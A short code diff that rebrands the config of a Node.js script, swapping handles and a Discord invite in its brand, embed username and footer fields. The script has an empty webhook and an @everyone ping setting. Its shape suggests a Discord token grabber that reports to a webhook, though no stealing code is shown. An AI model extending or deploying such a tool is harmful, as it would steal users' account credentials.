@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "JAMEKA",
+    brand: "ᗪ₳R₭ ᗪΞVÏŁ$🗽! 𝑱𝑴𝑨𝑬𝑲𝑨.〆#2003",
 
     webhook: "",
 
@@ -23,9 +23,9 @@ var config = {
     ping: [true, "@here/@everyone"],
 
     embed: {
-        username: "! 𝑱𝑴𝑨𝑬𝑲𝑨.〆#2003  https://discord.gg/nrYgKrhuGU",
+        username: "ᗪ₳R₭ ᗪΞVÏŁ$🗽! 𝑱𝑴𝑨𝑬𝑲𝑨.〆#2003 خـرفشُهツ#0001✌",
         footer: {
-            text: `! 𝑱𝑴𝑨𝑬𝑲𝑨.〆#2003  https://discord.gg/nrYgKrhuGU`,
+            text: `ᗪ₳R₭ ᗪΞVÏŁ$🗽! 𝑱𝑴𝑨𝑬𝑲𝑨.〆#2003 خـرفشُهツ#0001✌`,
             icon_url: "https://cdn.discordapp.com/avatars/895704973449494619/a_353d92690308e3241fbe1141cf65111b.gif?size=1024",
         },
         href: "https://discord.gg/nrYgKrhuGU",
